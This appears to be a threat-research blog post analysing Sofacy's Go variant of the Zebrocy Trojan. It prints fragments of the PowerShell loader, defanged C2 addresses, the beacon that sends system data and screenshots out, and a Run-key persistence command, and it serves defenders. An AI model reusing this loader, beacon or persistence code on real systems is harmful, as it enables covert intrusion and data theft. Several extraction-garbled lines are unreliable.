We first wrote about the Zebrocy tool in a blog that discussed\n[Sofacy’s parallel attack campaigns during the first quarter of 2018, and more recently during Sofacy attacks in late October and early](https://blog.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/)\nNovember. The developers of Zebrocy have once again created a new version the Trojan using a different programming language, specifically\nthe [Go language. The use of a different programming language to create a functionally similar Trojan is not new to this group, as past Zebrocy](https://en.wikipedia.org/wiki/Go_(programming_language))\n[variants have been developed in AutoIt,](https://en.wikipedia.org/wiki/AutoIt) [Delphi, VB.NET, C# and](https://en.wikipedia.org/wiki/Object_Pascal) [Visual C++. While we cannot be certain the impetus for this, we believe the](https://en.wikipedia.org/wiki/Microsoft_Visual_C%2B%2B)\nthreat group uses multiple languages to create their Trojans to make them differ structurally and visually to make detection more difficult.\n\nWe have seen two separate attacks deliver the Go variant of Zebrocy. The first attack occurred on October 11 and relied on a spear-phishing\nemail with an LNK shortcut attachment. The LNK shortcut is meant to run a series of PowerShell scripts to extract a payload from the shortcut\nto install and execute; however, the PowerShell scripts were coded incorrectly and could not install or run the payload as delivered. Therefore,\nthe first observed attack mentioned in this blog could not be successful, but the tactics, techniques and indicators are worth discussing for\nsituational awareness. More recently, we have seen Sofacy delivering the Go variant of Zebrocy using a document related to the Dear Joohn\nattack campaign that occurred in mid-October through mid-November.\n\n**The First Attack**\n\n\n-----\n\ne attac occu ed o Octobe, 0 8 a d o ed a spea p s g e a ( 93) d scuss g t e e ects o US sa ct o s o t e uss a\neconomy. The “From” address and the signature included the name of an individual at the targeted organization. The “To” field in the delivery\nemail was blank, which makes us believe that the targeted individuals were included in the “Bcc” field of this email. Figure 1 shows the delivery\nemail used in this attack.\n\n_Figure 1 Delivery email used in Go Zebrocy attack_\n\n**The Payload**\n\nThe delivery document Противодействие Думы Санкциям США.doc\n(SHA256:d77eb89501b0a60322bc69692007b9b7f1b5a85541a2aaf21caf7baf0fe0049e) attempts to masquerade as a Word document,\n[however, the file is a shortcut LNK. When opened (T1204), the LNK file attempts to run the following command line in a visible command](https://attack.mitre.org/techniques/T1204/)\n[prompt (T1059):](https://attack.mitre.org/techniques/T1059/)\n\n1 powershell.exe -nop -w 1 $i853=\n\n[TeXt.EnCoDING]::utF8.geTStrInG([conVErT]::frOmbaSE64stRing('JHAxLCRwMj0zNjU5LDY5MjQ3NjQ7JHBhdGhUb0xOSz0nQzUgcmVnaW\n\n[The shortcut uses PowerShell (T1086) to base64 decode (T1140) a second PowerShell script and executes it. The second PowerShell script](https://attack.mitre.org/techniques/T1086/)\ndecodes to the following:\n\n1 $p1,$p2=3659,6924764;$pathToLNK='C5 regional conference and training workshop on community policing(1).docx.lnk';if(-nOT(TeSt-pAtH $p\n\n[iO.diRectoRY]::sETCUrrentDIrEctoRY($DirD.dIreCTORYNAMe);}$FileStreama=nEw-objECT io.fILeSTreAm $pathToLNK,'OpeN','ReAd','reaD\n\n[io.SeEKoRiGin]::BEGin);$FileStreama.rEAD($ArrayMas,0,$p2);$ArrayMas=[ConverT]::FrOmbasE64CHarArRAy($ArrayMas,0,$ArrayMas.Le\n\nThe PowerShell script above attempts to extract another PowerShell script directly from the LNK shortcut file, which it would then execute. For\nunknown reasons, the actor that created this LNK shortcut included the incorrect filename for the LNK file, specifically C5 regional conference\nand training workshop on community policing(1).docx.lnk instead of the delivery document Противодействие Думы Санкциям США.doc. The\nLNK shortcut filename does not match the filename delivered in the email, so this attack would never be successful as the PowerShell script\nabove would be unable to obtain the payload to install on the system. The C5 regional conference and training workshop on community\npolicing(1).docx.lnk filename included in this LNK file may be an artifact from a previous attack using the same delivery LNK and payload.\n\nHad the attackers included the correct filename to the LNK delivery in the script above, it would have located the PowerShell script in the LNK\nfile by using a hardcoded offset of \"3659\", which it would have used to seek 3659 bytes into the LNK file. The script would then read a\nhardcoded number of bytes, specifically 6,924,764 bytes from this offset and executes it. The resulting PowerShell script obtained from within\nthe LNK file has the following contents, of which we have trimmed some of the encoded data and replaced it with \"[..snip..]\" for brevity:\n\n1 $6vlJwyyB = @('C5 regional conference and training workshop on community policing(1).exe','C5 regional conference and training workshop\non community policing(1).docx');$TcCd3Fej = \"C5 regional conference and training workshop on community policing(1).exe\";$Aq3NkyDG =\n@(\"TVqQAAMA[..snip..]\",\"UEsDBBQABgAIAA[..snip..]\");$ggdDQhlx = \"C5 regional conference and training workshop on community\npolicing(1).docx\";FOR($I=0;$I -lt $6vLjwYYb.LengTH;$i++){[BYtE[]]$YGktk0Nk = [cOnveRt]::frOmBaSE64StriNg($aq3nkYDg[$I]);\n\n[syStEm.IO.fILE]::WrItEaLlbYtES($EnV:pUbLIc+\"\\\"+$6VLJwYYB[$I],$YGktK0nk);}$qsVmUm76 =\n$Env:public+\"\\\"+$tCcd3Fej;$GGdDQhLxPatH = $env:publIC+\"\\\"+$gGddQHLX;staRT-pROCess -wINDowstylE HIDdeN -FIlepAth\n$qsVMuM76;StART-ProceSs -FilepaTh $GgDdQHlxpATH;\n\nThis final PowerShell script is responsible for decoding an executable and Word document that it will write to the system in the %PUBLIC%\nfolder with names C5 regional conference and training workshop on community policing(1).exe and C5 regional conference and training\nworkshop on community policing(1).docx, respectively. The decoded content written to the Word document contains the decoy content seen in\nFigure 2 (SHA256:b6b2f6aae80cba3fa142bd216decc1f6db024a5ab46d9c21cf6e4c1ab0bbe58b), which in this specific case is an agenda for a\n[conference that occurred between June 18 and 20, 2018 in Dushanbe, Tajikistan sponsored by Saferworld and the](https://www.saferworld.org.uk/) United States Institute of\nPeace.\n\n\n-----\n\n_Figure 2 Decoy document opened during installation of Go Zebrocy_\n\nThe decoded executable is the payload (SHA256: fcf03bf5ef4babce577dd13483391344e957fd2c855624c9f0573880b8cba62e) whose\ndeveloper wrote in the Go Language, which appears to be a variant of the Zebrocy Trojan that we have previously analyzed. The use of\nanother language to develop a similar Trojan in functionality to Zebrocy is fitting for this threat group, as we have previously seen this group\ncreate variants of Zebrocy in AutoIt, Delphi and C++. The similarities between this payload and previous Zebrocy variants include general highlevel capabilities as well as some more specific overlaps. Like other Zebrocy samples, this Zebrocy variant written in Go does initial collection\n[on the compromised system (T1119), exfiltrates this information to the C2 server and attempts to download, install and execute a payload from](https://attack.mitre.org/techniques/T1119/)\nthe C2. The Go variant also has some more specific overlaps in its functionality, including:\n\nThe use of ASCII hexadecimal obfuscation of strings\nThe use of the volume serial number without a hyphen obtained from the VOL command\nThe use of the output from \"systeminfo\" and \"tasklist\" in the outbound C2 beacon\nThe use of the string \"PrgStart\" within the C2 beacon\n\nThe most important overlap between the Go variant of Zebrocy and other variants is a shared C2 URL, specifically\nhxxp://89.37.226[.]148/technet-support/library/online-service-description.php?id_name= that was also used by Zebrocy samples\nde31a8a9110b32a82843e9216a3378cc1c5ea972a6bb2261ec111efb82f31e71 and\ndaf990f0b6564c3ac87fa87e325e6ffc907ed43ae65a3f088a42b5b120612593, which were both written in Delphi.\n\nThe Go variant of Zebrocy attempts to evade automated analysis by checking the executable filename of its process for the “)” character. If the\nfilename does not contain a “)” character, the Trojan immediately exits without executing its functional code. The Trojan looks for this character\nspecifically, because it expects to run as a file named C5 regional conference and training workshop on community policing(1).exe.\n\n[This Zebrocy variant uses HTTP POST requests to interact with its C2 server (T1071), which contains system specific information in the POST](https://attack.mitre.org/techniques/T1071/)\ndata section. The system specific information includes\n\n[Running processes via “tasklist” command (T1057).](https://attack.mitre.org/techniques/T1057/)\n[System information via the ”systeminfo” command (T1082).](https://attack.mitre.org/techniques/T1082/)\n[Local disk information (T1120) via WMI by running the command “wmic logicaldisk get caption,description,drivetype,providername,size”](https://attack.mitre.org/techniques/T1120/)\n[(T1047).](https://attack.mitre.org/techniques/T1047/)\n[A screenshot of the desktop (T1113) that the GoZebrocy tool takes using an open source Go library.](https://attack.mitre.org/techniques/T1113/)\n\nThe C2 communications between the Trojan and its C2 has the following structure:\n\nPOST /technet-support/library/online-service-description.php?id_name=[serial number from VOL command with hyphen removed] HTTP/1.1\n\nHost: 89.37.226[.]148\n\nUser-Agent: Go-http-client/1.1\n\nContent-Length: 570690\n\nContent-Type: application/x-www-form-urlencoded\n\nAccept-Encoding: gzip\n\nattach=PrgStart%3A[path to running Trojan]%0D%0A%5B[current time]%5D%0D%0A%0D%0A[results from wmic logicaldisk get\ncaption,description,drivetype,providername,size]%0D%0D%0A%0D%0D%0A%0D%0A%0D%0A[results systeminfo\ncommand]%0D%0A%0D%0A%0D%0A[results tasklist command]%0D%0A&support=[screenshot of system represented as ascii hexadecimal\nbytes]\n\n\n-----\n\ne C se e espo d to t s OS equest t asc e adec a bytes t at t e pay oad decode a d sa e to t e o o g e\n[(T1105):](https://attack.mitre.org/techniques/T1105/)\n\n%APPDATA%\\Identities\\{83AF1378-986F-1673-091A-02681FA62C3B}\\w32srv.exe\n\nThe payload will then execute this newly created file using the Golang \"os/exec\" module, specifically using the \"Command\" and \"Run\"\nfunctions in the \"os/exec\" module to run the following command line:\n\ncmd /C %APPDATA%\\Identities\\{83AF1378-986F-1673-091A-02681FA62C3B}\\w32srv.exe\n\n**Dear Joohn Related Delivery**\n\nThe second attack we observed delivering the Zebrocy variant written in the Go language is related to the Dear Joohn attacks that we have\npreviously published. While the Dear Joohn campaign occurred in mid-October to mid-November 2018, the delivery document (SHA256:\n346e5dc097b8653842b5b4acfad21e223b7fca976fb82b8c10d9fa4f3747dfa0) that ultimately installed the Go Zebrocy sample was created on\nDecember 3, 2018. This delivery document had an author name of Joohn, which is how we clustered the Dear Joohn delivery documents for\nthat campaign.\n\nLike the Dear Joohn attacks, the delivery document downloads a remote template (SHA256:\n[07646dc0a8c8946bb78be9b96147d4327705c1a3c3bd3fbcedab32c43d914305) via HTTP (T1071) that has an author and last saved by xxx.](https://attack.mitre.org/techniques/T1071/)\n[Upon opening the delivery document, the lure image seen in Figure 3 attempts to trick the recipient into enabling content (T1204) to run the](https://attack.mitre.org/techniques/T1204/)\nmacro within the downloaded remote template.\n\n_Figure 3 Lure image attempting to trick user into clicking the Enabling Content button_\n\n[The delivery document is configured to obtain a remote template from hxxps://bit[.]ly/2G8QrgL (T1102), as seen in the following from the](https://attack.mitre.org/techniques/T1102/)\ndocument’s word/_rels/settings.xml.rels file:\n\n\n1\n2\n\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\"\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"hxxps://bit[.]ly/2G8QrgL\"\nTargetMode=\"External\"/></Relationships>\n\n\nThe hxxps://bit[.]ly/2G8QrgL shortened link redirects to the remote template hosted at a URL of\nhxxp://89.37.226[.]123/Templates/NormalOld.dotm. Previous Dear Joohn delivery documents did not use a shortened link to obtain its remote\ntemplate, which suggests a shift in techniques used in this campaign. Fortunately for us, the shortened link provides some statistics on how\nmany visitors accessed the link and their country of origin. When accessed on December 5, 2018, Figure 4 shows the statistics for the\nshortened link, showing the link was created on December 3, 2018 at 12:56 PM, which was visited 75 times from mostly from Turkey.\n\n\n-----\n\n_gu e_ _Stat st cs o_ _s to s to t e s o te ed_ _used to po t to e_ _ote te_ _p ate ( ccessed_ _ece_ _be 5,_ _0 8)_\n\nThe remote template downloaded via this shortened link contains a macro similar to other Dear Joohn samples. The macro differs as it\nextracts a ZIP from the remote template file (SHA256: c817aab6e8dcaeaeae817a85ba209c0ca690be58b91e6cff0e3f0660336f9506) and\nsaves it to a file named driver_pack.zip. The archive contains an executable named driver_pack.exe (SHA256:\nb48b3d46ebfa6af8a25c007f77e6ed3c32fe4c6478311b8b0c7d6f4f8c82de76), which is a WinRAR SFX executable archive that contains\nanother executable named comsvc.exe. The WinRAR SFX archive extracts the comsvc.exe payload using the following SFX script:\n\nPath=%APPDATA%\\AppHistory\n\nSetup=comsvc.exe\n\nSilent=1\n\nOverwrite=2\n\nThe comsvc.exe executable (SHA256: 93680d34d798a22c618c96dec724517829ec3aad71215213a2dcb1eb190ff9fa) is a UPX packed variant\nof the Go Zebrocy malware (SHA256: 15a866c3c18046022a810aa97eaf2e20f942b8293b9cb6b4d5fb7746242c25b7), which is a downloader\nresponsible for obtaining and executing secondary payloads from a C2 server.\n\nLike other Zebrocy variants, this Go Zebrocy malware checks the path of the running process to make sure it contains comsvc, as it would if\nexecuted by the delivery document that would eventually save the payload to comsvc.exe. If the Go Zebrocy sample was not run as\ncomsvc.exe, it will send an HTTP POST request to google[.]com unlike other Zebrocy variants that will just exit, which we believe this is an\nattempt to further evade heuristic detection. Figure 5 shows the HTTP request sent to google[.]com.\n\n_Figure 5 HTTP POST to google.com in the event Go Zebrocy executes with incorrect filename_\n\nThe data sent in the HTTP POST request in Figure 5 decodes to <#0>0<##0><#1>1<##1><#2>1<##2>, which does not necessarily have any\npurpose other than filling the same HTTP POST data delimiters that Go Zebrocy will use when communicating with the C2. In the event that\nthe sample was run as comsvc.exe, the Trojan will reach out to the following URL to communicate with its C2 server:\n\nhxxp://89.37.226[.]123/advance/portable_version/service.php\n\n[The Go Zebrocy tool will get the volume serial number, take a screenshot of the system (T1113) and gather system specific information using a](https://attack.mitre.org/techniques/T1113/)\n[legitimate library called psutil that is available on Github. The Trojan will call the](https://github.com/shirou/gopsutil) `Host Info function from the psutil library that will effectively`\ngather platform information (operating system, version etc.), the time the system was booted, the system uptime, the system’s GUID, and\n[process IDs for running processes (T1057). The Zebrocy variant will send an HTTP POST request (T1071) to the above URL with post data](https://attack.mitre.org/techniques/T1057/)\nstructured as follows:\n\nproject=%3C%230%3E4D291F48%3C%23%230%3E%3C%231%3E[serial number of storage\nvolume]%3C%23%230%3E%3C%231%3E[gathered system information]%3C%23%231%3E%3C%232%3E[screenshot in JPEG\nformat]%3C%23%232%3E\n\nThe hexadecimal characters in the HTTP POST data are used as delimiters, which represent the following:\n\n<#0>[serial number of storage volume]<##0><#1>[gathered system information]<##1><#2>[screenshot in JPEG format]<##2>\n\nThe C2 will respond to the above request with a hexadecimal encoded payload that the Trojan will save to the system and execute. The Trojan\nwrites the secondary payload to the following file:\n\n%LOCALAPPDATA%\\Microsoft\\Feeds\\{5588ACFD-6436-411B-A5CE-666AE6A92D3D}~\\wcncsvc.exe\n\n[Before executing the dropped file, the Trojan will create an auto run registry key (T1060) to have the secondary payload run each time the user](https://attack.mitre.org/techniques/T1060/)\n[logs in using the following command line (T1059):](https://attack.mitre.org/techniques/T1059/)\n\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Media Center Extender Service\n\nDuring our analysis, the secondary payload downloaded from the C2 is another Trojan written in Go language (SHA256:\n50d610226aa646dd643fab350b48219626918305aaa86f9dbd356c78a19204cc), which the actors packed with UPX (SHA256:\n[ee9218a451c455fbca45460c0a27e1881833bd2a05325ed60f30bd4d14bb2fdc) (T1045). This secondary payload is another downloader that](https://attack.mitre.org/techniques/T1045/)\nuses HTTPS instead of HTTP for its C2 communications. This secondary payload communicates with the following URL as its C2:\n\n\n-----\n\nps // 90 9 6 [ ] 86/p g/ age/do p p\n\nThe HTTP POST request sent via HTTPS will look as follows, specifically including the first four bytes of the volume serial number and the first\nfour characters of the hostname within the post data in a field labeled \"l\" as seen in Figure 6.\n\n_Figure 6 HTTP beacon sent by the secondary payload within its HTTPS C2 channel_\n\n**Conclusion**\n\nThe Sofacy group continues to use variants of the Zebrocy payload in its attack campaigns. Developers of Zebrocy continue to create new\nvariants of the Trojan using different coding languages, which in this particular case used the Go language. The adversaries made some\ndrastic errors to the delivery LNK shortcut, which made this attack seemingly ineffective. Regardless of the attack’s effectiveness, the\ntechniques and indicators we observed still provide analytical points for correlation and should be included in an organizations security\ndefenses as the group may use the payload and infrastructure in future attacks. It is also apparent that the Sofacy group will use these new\nvariants of Zebrocy across multiple different campaigns, as the Go variant of Zebrocy was delivered via the LNK shortcut and a Dear Joohn\ndelivery document.\n\nPalo Alto customers can protect themselves against this threat by:\n\nUsing a file blocking profile on our next-gen firewall to block LNK shortcuts sent via email.
